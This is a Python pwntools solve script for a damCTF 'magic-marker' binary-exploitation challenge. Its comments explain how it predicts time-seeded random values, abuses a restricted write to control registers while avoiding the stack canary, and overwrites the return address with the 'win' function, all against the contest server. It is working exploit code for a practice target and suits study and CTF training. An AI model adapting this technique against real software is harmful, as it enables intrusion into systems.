#!/usr/bin/env python3

#Kudos to damCTF for creating this awesome challenge.Ret2win chall has never been more exciting than this.
#The main goal is to overwrite the return address with the win function address.
#First the register values comes from a random function which takes seed as epoch time 
#We can easily deduct this value creating a timer in c and get the values
#Then we have to set the desired values in register we have to increase the values 
#But that depends on the maze values to get east and south
#But the problems is the values are random too and generate maze is hard to reverse
#But we don't need the random values to favour us because of the write something option
#Which gives us a write condition on the maze values and we can tamper it to always give east and south
#By writing value 6 to it.
#By doing this we can edit the value as we like untill the registers favour us to make a return address overwrite
#Be carefull peeps bcoz there is a stack canary in between..Even the return address overwrite will not help you
#If the stack canary is overwritten during the exit it will abort the binary
#For this challenge you need atmost of 85 restricted write conditions to make out of bound write to get the flag


from pwn import *
import time

e = ELF("./magic-marker")
r1 = remote("chals.damctf.xyz",31313)
#r1 = process("./magic-marker")
r2 = process("./timer")
values = r2.recv()
values = values.split(b"\n")
rand1,rand2 = int(values[0]),int(values[1])
log.info("The time seed  random values after mod are " + str(rand1) + " " + str(rand2))
r2.close()
r1.recvuntil(b"What would you like to do?")
r1.sendline(b"jump up and down")
r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
r1.sendline(b"x")
payload = p64(0) * 3 + p32(0) + p32(0x6)
r1.recvuntil(b"you like to write?")
r1.sendline(payload)
log.info("Using the write condition to tamper the maze values to always increase the regs values")
log.info("Tampering the rbx register using the above restricted write what where condition multiple values")
while(rand1 < 0x27):
    r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
    r1.sendline(b"s")
    r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
    r1.sendline(b"x")
    r1.recvuntil(b"you like to write?")
    r1.sendline(payload)
    rand1+=1
log.info("Tampering the rbx register using the above restricted write what where condition multiple values")
while(rand2 < 0x27 ):
    print("loop 2")
    r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
    r1.sendline(b"d")
    r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
    if(rand2 == 0x26):
        r1.sendline(b"x")
        r1.recvuntil(b"you like to write?")
        r1.sendline(payload)
        r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
        r1.sendline(b"d")
        r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
        r1.sendline(b"d")
        r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
        r1.sendline(b"d")
        r1.sendline(b"x")
        r1.recvuntil(b"you like to write?")
        r1.sendline(payload)
        r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
        r1.sendline(b"d")
        log.info("r12 and rbx registers now hold the required values to make a return address overwrite")
        r1.sendline(b"x")
        r1.recvuntil(b"you like to write?")
        r1.sendline(b"A" * 8 + p64(e.sym["win"]))
        log.info("Return address overwritten with win function")
        r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
        r1.sendline(b"q")
        log.info("Finally after using atmost 85 write conditions flag finally arrives")
    else:
        r1.sendline(b"x")
        r1.recvuntil(b"you like to write?")
        r1.sendline(payload)
    rand2+=1
r1.interactive()
